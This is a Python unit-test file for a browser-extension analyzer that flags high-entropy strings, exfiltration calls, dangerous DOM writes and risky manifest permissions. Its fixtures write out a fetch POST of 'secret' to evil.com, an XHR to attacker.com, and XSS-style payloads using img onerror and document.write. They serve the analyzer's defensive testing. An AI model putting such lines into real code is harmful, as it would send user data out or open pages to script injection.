import os
import sys
import shutil
import unittest

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), "../src"))
from analyze_extension import (
    analyze_javascript_files,
    analyze_manifest,
    calculate_entropy,
)


class TestRuleBasedAnalysis(unittest.TestCase):
    def setUp(self):
        self.test_dir = "test_extension_data"
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)
        os.makedirs(self.test_dir)

    def tearDown(self):
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)

    def test_entropy_detection(self):
        # Create a file with a high entropy string
        js_content = """
        var secret = "a8f92384a982349823498234982349823498234982349823498234982349823498234"; // Not high enough?
        var packed = "x\x9c\xbd\x92\xc1\x0e\xc20\x10D\xaf\xf2\x8a\xe0\x0e\x16\x05\x8b\x82\x98\x18\x82\x8a\xe0\x0e\x16\x05\x8b\x82\x98\x18\x82\x8a\xe0\x0e\x16\x05\x8b\x82\x98\x18\x82";
        """
        # Use safe characters to avoid breaking JS string syntax
        import random
        import string

        # ascii_letters + digits is 62 chars. log2(62) ~= 5.95
        high_entropy = "".join(
            random.choices(string.ascii_letters + string.digits, k=100)
        )

        js_content = f'var s = "{high_entropy}";'

        with open(os.path.join(self.test_dir, "entropy.js"), "w") as f:
            f.write(js_content)

        findings = analyze_javascript_files(self.test_dir)

        # Check if high_entropy_string is in findings
        found = any(f["type"] == "high_entropy_string" for f in findings)
        self.assertTrue(
            found,
            f"Should detect high entropy string. Entropy of string: {calculate_entropy(high_entropy)}",
        )

    def test_exfiltration_detection(self):
        js_content = """
        fetch('https://evil.com/data', { method: 'POST', body: 'secret' });
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://attacker.com');
        """
        with open(os.path.join(self.test_dir, "exfil.js"), "w") as f:
            f.write(js_content)

        findings = analyze_javascript_files(self.test_dir)

        fetch_found = any(
            f["type"] == "exfiltration_risk" and f["value"] == "fetch" for f in findings
        )
        xhr_found = any(
            f["type"] == "exfiltration_risk" and f["value"] == "XMLHttpRequest"
            for f in findings
        )

        self.assertTrue(fetch_found, "Should detect fetch")
        self.assertTrue(xhr_found, "Should detect XMLHttpRequest")

    def test_dangerous_dom(self):
        js_content = """
        document.body.innerHTML = '<img src=x onerror=alert(1)>';
        document.write('<script>alert(1)</script>');
        """
        with open(os.path.join(self.test_dir, "dom.js"), "w") as f:
            f.write(js_content)

        findings = analyze_javascript_files(self.test_dir)

        innerhtml_found = any(
            f["type"] == "dangerous_dom" and f["value"] == "innerHTML" for f in findings
        )
        docwrite_found = any(
            f["type"] == "dangerous_dom" and f["value"] == "document.write"
            for f in findings
        )

        self.assertTrue(innerhtml_found, "Should detect innerHTML")
        self.assertTrue(docwrite_found, "Should detect document.write")

    def test_manifest_permissions(self):
        manifest = {
            "manifest_version": 3,
            "name": "Test",
            "version": "1.0",
            "permissions": [
                "management",
                "proxy",
                "privacy",
                "downloads",
                "nativeMessaging",
            ],
        }

        findings = analyze_manifest(manifest)
        risky = findings["risky_permissions"]

        for perm in ["management", "proxy", "privacy", "downloads", "nativeMessaging"]:
            self.assertIn(perm, risky, f"Should detect {perm} as risky")


if __name__ == "__main__":
    unittest.main()
